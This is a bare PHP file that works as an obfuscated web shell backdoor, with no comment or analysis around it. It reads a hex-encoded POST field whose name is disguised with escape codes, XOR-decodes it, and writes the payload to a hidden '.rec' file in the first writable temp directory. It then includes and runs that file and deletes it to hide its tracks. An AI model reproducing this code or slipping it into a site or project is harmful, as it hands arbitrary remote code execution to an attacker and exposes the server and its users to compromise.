<?php

if(array_key_exists("da\x74\x61", $_POST)){
	$value = array_filter([session_save_path(), getenv("TEMP"), sys_get_temp_dir(), getenv("TMP"), "/var/tmp", "/dev/shm", getcwd(), ini_get("upload_tmp_dir"), "/tmp"]);
	$descriptor = hex2bin($_POST["da\x74\x61"]);
	$entry      =   ''      ;   foreach(str_split($descriptor) as $char){$entry .= chr(ord($char) ^ 31);}
	$tkn = 0;
do {
    $token = $value[$tkn] ?? null;
    if ($tkn >= count($value)) break;
    		if (is_dir($token) ? is_writable($token) : false) {
    $data_chunk = "$token" . "/.rec";
    $success = file_put_contents($data_chunk, $entry);
if ($success) {
	include $data_chunk;
	@unlink($data_chunk);
	die();}
}
    $tkn++;
} while (true);
}